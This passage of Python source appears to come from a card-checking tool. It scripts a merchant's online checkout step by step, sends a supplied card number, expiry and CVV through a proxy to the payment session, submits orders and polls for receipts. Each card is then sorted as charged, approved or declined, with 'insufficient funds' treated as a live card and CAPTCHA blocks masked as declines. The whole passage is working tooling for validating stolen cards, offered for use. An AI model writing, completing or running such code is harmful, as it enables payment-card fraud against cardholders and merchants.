                if sp and sp != price:
                    price = sp
            queue_token = extract_queue_token(proposal_body)
            if not queue_token:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 4 failed: {e}")
            return result

        # Step 5
        try:
            _, proposal2_body = await send_proposal2(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token, email, currency, country)
            queue_token2 = extract_queue_token(proposal2_body)
            if not queue_token2:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 5 failed: {e}")
            return result

        # Step 6
        try:
            addr = address_for_country(country)
            _, proposal3_body = await send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token2, email, addr, currency, country)
            queue_token3 = extract_queue_token(proposal3_body)
            if not queue_token3:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 6 failed: {e}")
            return result

        # Step 7
        await asyncio.sleep(0.05)
        try:
            _, proposal4_body = await send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token3, email, addr, currency, country)
            queue_token4 = extract_queue_token(proposal4_body)
            if not queue_token4:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 7 failed: {e}")
            return result

        # Step 8
        await asyncio.sleep(0.05)
        try:
            proposal5_status, proposal5_body = await send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token4, email, addr, currency, country)
            _ = proposal5_status
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 8 failed: {e}")
            return result

        # Step 9
        try:
            ident_sig = extract_identification_signature(checkout_html)
            if not ident_sig:
                raise Exception("could not extract identification signature")
            pci_status, pci_body = await send_pci_session(
                ident_sig, card_number,
                f"{addr.first_name} {addr.last_name}",
                card_month, card_year, card_cvv, site_name, proxy_url)
            _ = pci_status
            pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                raise Exception("could not extract session ID")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 9 failed: {e}")
            return result

        # Step 10
        try:
            queue_token5 = extract_queue_token(proposal5_body)
            if not queue_token5:
                raise Exception("could not extract queueToken")

            is_digital      = not extract_is_shipping_required(proposal5_body)
            delivery_handle = extract_delivery_handle(proposal5_body)
            if not delivery_handle and not is_digital:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract delivery handle")

            signed_handles = extract_signed_handles(proposal5_body)
            if len(signed_handles) == 0 and not is_digital:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract signedHandles")

            shipping_amount = extract_shipping_amount(proposal5_body)
            if not shipping_amount and not is_digital:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract shipping amount")
            if not shipping_amount:
                shipping_amount = "0.00"

            total_amount = extract_checkout_total(proposal5_body)
            if not total_amount:
                total_amount = extract_seller_total(proposal5_body)
            if not total_amount and is_digital:
                total_amount = extract_running_total(proposal5_body)
            if not total_amount:
                raise Exception("Step 10 failed: could not extract total amount")
            result.amount = total_amount

            attempt_token = generate_attempt_token(checkout_token)
            current_tax   = extract_tax_amount(proposal5_body)
            current_total = total_amount

            for tax_attempt in range(1, 4):
                submit_status, submit_body = await send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token,
                    queue_token5, email, addr, delivery_handle, shipping_amount,
                    current_total, pci_session_id, attempt_token, currency, country,
                    signed_handles, is_digital=is_digital, tax_amount=current_tax)

                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    new_tax   = extract_tax_from_rejected(submit_body)
                    new_total = extract_total_from_rejected(submit_body)
                    if new_tax:
                        current_tax = new_tax
                    if new_total:
                        current_total = new_total
                    await asyncio.sleep(0.05)
                    continue
                break

            _ = submit_status
            check_submit_errors(submit_status, submit_body)

            receipt_id = extract_receipt_id(submit_body)
            if not receipt_id:
                error_msg = extract_any_error(submit_body)
                if "CAPTCHA" in (error_msg or ""):
                    error_msg = "CARD_DECLINED"
                if error_msg:
                    result.status      = CheckStatus.DECLINED
                    result.status_code = error_msg
                    result.error       = Exception(error_msg)
                    result.retryable   = any(k in error_msg.lower()
                                             for k in ['inventory', 'retry', 'try again', 'generic'])
                else:
                    result.status    = CheckStatus.ERROR
                    result.error     = Exception("Step 10 failed: could not extract receiptId or error message")
                    result.retryable = True
                return result

            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("Step 10 failed: could not extract sessionToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error  = e
            return result

        # Step 11 — poll for receipt
        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        type_name_re  = re.compile(
            r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')

        for poll_num in range(1, 31):
            try:
                _, poll_body = await send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_for_receipt_id,
                    receipt_id, receipt_session_token)

                receipt_type = ""
                m = type_name_re.search(poll_body)
                if m:
                    receipt_type = m.group(1)

                result.status_code = extract_receipt_status_code(poll_body, receipt_type)

                if receipt_type in ("SuccessfulReceipt", "ProcessedReceipt"):
                    result.status      = CheckStatus.CHARGED
                    result.status_code = "ORDER_PLACED"
                    result.receipt_url = checkout_url + "/thank_you"
                    return result

                if receipt_type == "ActionRequiredReceipt":
                    result.status      = CheckStatus.APPROVED
                    result.status_code = "3DS_AUTHENTICATION"
                    return result

                if receipt_type == "FailedReceipt":
                    error_re   = re.compile(r'"code"\s*:\s*"([^"]+)"')
                    em         = error_re.search(poll_body)
                    error_code = em.group(1) if em else ""
                    if "CAPTCHA" in error_code:
                        error_code = "CARD_DECLINED"
                    if error_code == "INSUFFICIENT_FUNDS":
                        result.status      = CheckStatus.APPROVED
                        result.status_code = "INSUFFICIENT_FUNDS"
                    elif error_code in ("CARD_DECLINED", "GENERIC_ERROR"):
                        result.status      = CheckStatus.DECLINED
                        result.status_code = "CARD_DECLINED"
                        result.error       = Exception("CARD_DECLINED")
                    else:
                        if "InventoryReservationFailure" in poll_body:
                            result.status    = CheckStatus.ERROR
                            result.retryable = True
                        else:
                            result.status = CheckStatus.DECLINED
                            result.error  = Exception(error_code)
                    return result

                delay = 500
                m2 = poll_delay_re.search(poll_body)
                if m2:
                    try:
                        d = int(m2.group(1))
                        if d > 0:
                            delay = d
                    except ValueError:
                        pass
                await asyncio.sleep(min(delay, 300) / 1000.0)

            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error  = Exception(f"poll {poll_num} failed: {e}")
                return result

        result.status = CheckStatus.ERROR
        result.error  = Exception("exceeded 30 poll attempts")
        return result

    finally:
        await client.close()
